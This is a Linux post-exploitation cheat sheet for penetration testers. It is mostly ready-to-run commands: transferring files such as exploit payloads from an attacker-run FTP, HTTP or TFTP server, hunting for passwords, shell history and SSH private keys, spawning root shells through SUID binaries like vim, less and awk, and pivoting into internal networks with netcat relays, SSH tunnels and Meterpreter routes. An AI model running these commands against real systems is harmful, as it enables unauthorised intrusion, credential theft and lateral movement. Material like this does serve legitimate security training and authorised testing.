# __Kapi Linux Post Exploitation Cheatsheet__
## __1. Objective__
To maintain knowledge of:
* Post exploitation on Linux machines
* This cheat covers only through pivoting but not covering trace

## __2. Post Exploitation - Linux__
### __2.1 Files Transfer__
__Netcat__
* Receiver
```
nc -l -p 1234 > out.file
```

* Sender
```
nc -w 3 <destination> 1234 < out.file
```

__FTP__
* FTP server using Python
```
apt-get install python-pyftpdlib

python -m pyftpdlib -p 21
```

* Download file from FTP server

```
wget ftp://192.168.2.50:21/file

wget --user='user' --password='P@ssw0rd' ftp://192.168.2.1:21/myfolder/exploit.txt

curl ftp://192.168.2.1:21/myfolder/exploit.txt --user user:P@ssw0rd -o exploit.txt

echo '#!/bin/bash' > ftp ;echo 'HOST=192.168.2.1' >> ftp ;echo 'USER=user' >> ftp ;echo 'PASSWORD=P@ssw0rd' >> ftp ;echo '' >> ftp ;echo 'ftp -inv $HOST <<EOF' >> ftp ;echo 'user $USER $PASSWORD' >> ftp ;echo 'cd /myfolder' >> ftp ;echo 'get exploit.txt' >> ftp ;echo 'bye' >> ftp ;echo 'EOF' >> ftp; chmod +x ftp; ./ftp; rm -f ftp
```

__HTTP__
* HTTP server using Python
```
python -m SimpleHTTPServer 8081
```

* Download file from HTTP server
```
wget http://192.168.2.50:8081/file -O exploit.txt

curl http://192.168.2.50:8081/file -o exploit.txt
```

__TFTP__
* TFTP server
```
apt-get install atftpd

atftpd --daemon --port 69 /tmp
```

* TFTP client
```
echo '#!/bin/bash' > tftp;echo 'HOST=192.168.2.50' >> tftp;echo '' >> tftp;echo 'tftp $HOST <<EOF' >> tftp;echo 'get exploit.txt.1' >> tftp;echo 'quit' >> tftp;echo 'EOF' >> tftp;chmod +x tftp; ./tftp; rm -f tftp
```

____

### __2.2 Privilege Escalation__
__2.2.0 Check the environment__
* Check which user we've currently compromised
```
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)

$ whoami
overflow
```

* Check kernel version
```
$ cat /proc/version
Linux version 4.6.0-kali1-686-pae (devel@kali.org) (gcc version 5.4.0 20160609 (Debian 5.4.0-6) ) #1 SMP Debian 4.6.4-1kali1 (2016-07-21)

$ uname -a
Linux BOEING 4.6.0-kali1-686-pae #1 SMP Debian 4.6.4-1kali1 (2016-07-21) i686 GNU/Linux

$ rpm -q kernel
$ dmesg | grep Linux
$ ls /boot | grep vmlinuz-
```

* Check OS distribution
```
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release      # Debian based
cat /etc/redhat-release   # Redhat based
```

* Check environment variable
```
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

* Find user/password in files
```
grep -i user <filename>
grep -i pass <filename>
```

* Networking
```
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
```

* Communicating system what other users & hosts are communicating with the system?
```
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
```

* User information
```
id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
```

* Can user use SUDO
```
cat /etc/sudoers
sudo -l
```

* Check /root, /home
```
ls -ahlR /root/
ls -ahlR /home/
```

* Shell history
```
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
```

* SSH private key
```
find / -name .ssh

cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
```

* Check for mails
```
ls -alhR /var/mail
```

* Check log files
```
ls -alR /etc/httpd/logs
ls -alR /var/log/apache2
ls -alR /var/log/apache
ls -alR /var/log
ls -alR /var/webmin
ls -alR /var/www/logs
ls -alh /var/log
```


* Jailbreaking shell to TTY

|   Binary    |                         Command                            | 
|-------------|------------------------------------------------------------| 
| python      | python -c 'import pty;pty.spawn("/bin/bash")'              | 
| python      | python -c 'import pty;pty.spawn("/bin/sh")'                | 
| call shell  | echo os.system('/bin/bash')                                | 
| call shell  | /bin/sh -i                                                 | 
| vi          | :!bash                                                     | 
| vi          | :set shell=/bin/bash:shell                                 | 
| vi          | :!bash                                                     | 
| vi          | :set shell=/bin/bash:shell                                 | 
| awk         | awk 'BEGIN {system("/bin/bash")}'                          | 
| find        | find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \; | 
| perl        | perl -e 'exec "/bin/bash";'                                | 
| sh          | /bin/sh -i                                                 | 

__2.2.1 Escalate privilege - SUID & SGID file__
* Find SGID bit set files
```
find / -perm -g=s -type f 2>/dev/null
```

* Find SUID bit set files
```
find / -perm -u=s -type f 2>/dev/null
```

* Find SUID or SGID bit set files
```
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
```

If the following binary has SUID bit set you may exploit them to get root shell:
* vi
```
bash-4.3$ ls -al /usr/bin/vim.gtk
-rwsr-xr-x 1 root root 3170356 May 10  2016 /usr/bin/vim.gtk

vi /tmp/exploit
:!/bin/sh
# id
uid=1002(overflow) gid=1002(overflow) euid=0(root) groups=1002(overflow)
```

* vim
```
bash-4.3$ ls -al /usr/bin/vim.gtk
-rwsr-xr-x 1 root root 3170356 May 10  2016 /usr/bin/vim.gtk

vim /tmp/exploit
:!/bin/sh
# id
uid=1002(overflow) gid=1002(overflow) euid=0(root) groups=1002(overflow)
```

* less
```
bash-4.3$ ls -al /bin/less
-rwsr-xr-x 1 root root 180124 Feb 28  2016 /bin/less

bash-4.3$ less /etc/passwd
!/bin/sh
# id
uid=1002(overflow) gid=1002(overflow) euid=0(root) groups=1002(overflow)
```

* more
```
$ ls -al /bin/more
-rwsr-xr-x 1 root root 38720 Aug 15  2016 /bin/more

bash-4.3$ more /etc/passwd
!/bin/sh
# id
uid=1002(overflow) gid=1002(overflow) euid=0(root) groups=1002(overflow)
```

* awk
```
$ ls -al /usr/bin/gawk
-rwsr-xr-x 1 root root 733552 Jan 25  2017 /usr/bin/gawk

bash-4.3$ awk 'BEGIN {system("/bin/sh")}'
# id
uid=1002(overflow) gid=1002(overflow) euid=0(root) groups=1002(overflow)
```

* bash
```
bash-4.3$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1109604 Jun 24  2016 /bin/bash

bash-4.3$ /bin/bash -p
bash-4.3# id
uid=1002(overflow) gid=1002(overflow) euid=0(root) groups=1002(overflow)
```

* man
```
$ man some_command
!/bin/sh
# id
uid=1002(overflow) gid=1002(overflow) euid=0(root) groups=1002(overflow)
```

__2.2.2 Escalate privilege - Vulnerable application__

* Check for SUID bit set software and pay attention

* Check for running services
```
ps aux
ps -ef
top
cat /etc/services
```

* Check for running service with root
```
ps aux | grep root
ps -ef | grep root
```

* Check for installed software
```
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
```

* Check for config file
```
find /etc/ -name *conf
find /opt/ -name *conf

cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
```

* Check for scheduled jobs
```
ls -alhR /var/spool/cron
ls -alR /etc/ | grep cron
ls -alR /etc/cron*

cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

__2.2.3 Escalate privilege - Kernel exploit__

Check kernel and OS distribution then seach for public exploits

__2.2.4 Additional ways__

1. World writtable folder could allow us to change application configuration
* World-writeable folders
```
# world-writeable folders
find / -writable -type d 2>/dev/null

# world-writeable folders
find / -perm -222 -type d 2>/dev/null

# world-writeable folders
find / -perm -o w -type d 2>/dev/null

# world-executable folders
find / -perm -o x -type d 2>/dev/null

# world-writeable & executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

# world-writeable files
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print

# Noowner files
find /dir -xdev \( -nouser -o -nogroup \) -print
```

2. Users may be assigned to dangerous group
* **wheel** group that could use SUDO

____

### __2.3 Pivoting__
```
 ________________________
|                        |
|Attacker Kali Linux IP  |
|                        |   ---------> Linux (192.168.112.128)     -----
|                        |                                               |-------> Target Linux
|192.168.112.132         |                                               |  (192.168.128.128)
|                        |    ---------> Windows (192.168.112.129)  -----
|________________________|

```

__2.3.1 Netcat Relay__
On pivot host
```
mknod backpipe p
nc -l -p localportonpivothost 0<backpipe | nc <targetIP> <targetPort> 1>backpipe

mknod backpipe p
nc -l -p 81 0<backpipe | nc 192.168.128.128 80 1>backpipe
```

__2.3.2 SSH Local Port Forwading__

On attacker's system
```
ssh -L localportonpivothost:targetIP:targetport user@pivothost

ssh -L 80:192.168.128.128:80 user@192.168.112.128

root@BOEING:~# ssh -L 81:161.246.4.119:80 root@127.0.0.1
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
root@127.0.0.1's password: 

Last login: Mon Jul 24 05:32:39 2017 from 192.168.226.1
root@BOEING:~# nc -vvv 127.0.0.1 81
localhost [127.0.0.1] 81 (?) open
GET / HTTP/1.0

HTTP/1.1 200 OK
Date: Mon, 24 Jul 2017 18:58:35 GMT
```

* Use nmap with SSH pivot host
```
nmap <arguments> -p 81 pivothost
```

* Use nikto with SSH pivot host
```
nikto -host 192.168.128.128 -useproxy http://pivothost:81/
```

__2.3.3 SSH Dynamic Port Forwarding (SOCKS Proxy)__
On attacker's system
```
ssh -D 127.0.0.1:9150 -f -N user@192.168.112.128
```
Firefox, Iceweasel, and Burb Suite can be configured to use SOCKS proxy. ProxyChains must be configured to work also. Adding the following line to proxychains.conf
```
socks5 127.0.0.1 9150
```

Then use SOCKS to connect to targets
```
proxychains nc 192.168.128.128 80
pryxychains nmap
.
.
.
```

__2.3.4 Pivoting with Meterpreter Session__
```
meterpreter> background
> route add 192.168.128.0 255.255.255.0 1

use auxiliary/server/socks4a 
set SRVPORT 1082

vi /etc/proxychains.conf 
> socks4  127.0.0.1 1082
proxychains <somethings>
```
If it does not work then may follow the following

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```



## __Reference & Credits__
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
* https://www.rebootuser.com/?p=1623
* https://github.com/xapax/security/blob/master/privilege_escalation_-_linux.md
* https://pentestlab.blog/2017/09/25/suid-executables/